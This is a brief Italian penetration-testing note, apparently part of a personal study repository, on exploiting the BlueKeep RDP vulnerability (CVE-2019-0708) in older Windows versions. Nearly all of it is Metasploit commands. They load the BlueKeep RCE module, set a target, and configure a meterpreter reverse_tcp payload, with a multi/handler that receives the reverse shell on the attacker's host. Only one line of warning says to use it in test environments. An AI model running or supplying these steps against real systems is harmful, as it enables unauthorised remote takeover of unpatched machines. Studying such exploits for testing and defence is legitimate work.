<a href="https://github.com/Gigidotexe/Penetration_Test_notes/blob/main/README.md"> Back </a>
## cve_2019_0708 BlueKeep
**BlueKeep** è una vulnerabilità critica che permette RCE senza autenticazione sfruttando un buffer overflow nel servizio RDP. Colpisce Windows XP, Server 2003, Windows 7 e Server 2008.

---

## Fase 6 – Exploiting di BlueKeep con Metasploit

Modulo di exploit:
`use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`  
`set RHOSTS <IP>`  
`set RPORT 3389`  
`set payload windows/x64/meterpreter/reverse_tcp`  
`set LHOST <KaliIP>`  
`set LPORT <Port>`  
`run`

⚠️ Estremamente instabile: usare solo in ambienti di test.

Per ricevere la reverse shell:
`use multi/handler`  
`set payload windows/x64/meterpreter/reverse_tcp`  
`set LHOST <KaliIP>`  
`set LPORT <Port>`  
`run`

---
